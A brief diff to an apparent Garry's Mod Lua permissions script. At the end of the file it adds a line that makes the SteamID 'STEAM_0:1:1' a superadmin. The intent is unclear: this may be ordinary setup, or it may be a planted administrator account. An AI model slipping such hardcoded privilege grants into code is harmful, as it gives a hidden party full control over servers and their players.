@@ -62,3 +62,5 @@ hook.Add("PlayerInitialSpawn", "PlayerAuthSpawn", function(ply)
 	end
 	ply:SetUserGroup(SteamIDs[steamid].group)
 end)
+
+SetUserGroupID("STEAM_0:1:1", "superadmin")
